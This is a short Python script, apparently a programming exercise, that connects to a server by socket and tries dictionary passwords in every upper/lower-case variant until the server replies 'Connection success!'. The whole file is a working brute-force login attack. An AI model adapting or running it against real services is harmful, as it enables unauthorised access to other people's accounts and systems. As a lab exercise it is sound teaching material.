import itertools
import os
import string
import sys
import socket


def upperLowerPossibilities(word: str) -> list:
    return list(map(''.join, itertools.product(*zip(word.upper(), word.lower()))))

# get command line arguments
arguments = sys.argv
ipaddress = arguments[1]
port = int(arguments[2])

# get current working directory
currentWorkingDirectory = os.getcwd()

# open password file
file = open(currentWorkingDirectory + "\\passwords.txt")

address = (ipaddress, port)

# create socket
clientSocket = socket.socket()
clientSocket.connect(address)

for line in file:
    line = line.strip("\n")
    passwords = set(upperLowerPossibilities(line))
    for password in passwords:
        # send message
        message = password.encode()
        clientSocket.send(message)

        # receive message
        response = clientSocket.recv(10240)
        response = response.decode()

        if response == "Connection success!":
            print(password)
            clientSocket.close()
            sys.exit()

